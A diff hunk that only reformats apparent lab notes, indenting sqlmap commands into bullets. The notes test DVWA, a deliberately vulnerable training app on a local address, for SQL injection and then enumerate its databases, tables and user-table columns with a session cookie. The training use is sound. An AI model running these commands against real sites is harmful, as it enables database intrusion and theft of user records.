@@ -3,10 +3,10 @@ ask you if you want to set those diferently. This is obviously a vulnerability a
 enforce its own security and session ID.
 
 * Test for SQL injection vulnerabilities within these fields:
-sqlmap --url "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=hello&Submit=Submit#" -p id,Submit --cookie="PHPSESSID=4q25s9eis93ul7uj24f0164vb0;security=low" --dbs --dbms=mysql
+	* sqlmap --url "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=hello&Submit=Submit#" -p id,Submit --cookie="PHPSESSID=4q25s9eis93ul7uj24f0164vb0;security=low" --dbs --dbms=mysql
 
 * Grab tables:
-sqlmap --url "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=hello&Submit=Submit#" -p id,Submit --cookie="PHPSESSID=4q25s9eis93ul7uj24f0164vb0;security=low" --tables
+	* sqlmap --url "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=hello&Submit=Submit#" -p id,Submit --cookie="PHPSESSID=4q25s9eis93ul7uj24f0164vb0;security=low" --tables
 
 * Grab columns from the Users table
 sqlmap --url "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=hello&Submit=Submit#" -p id,Submit --cookie="PHPSESSID=4q25s9eis93ul7uj24f0164vb0;security=low" -D dvwa -T users --columns
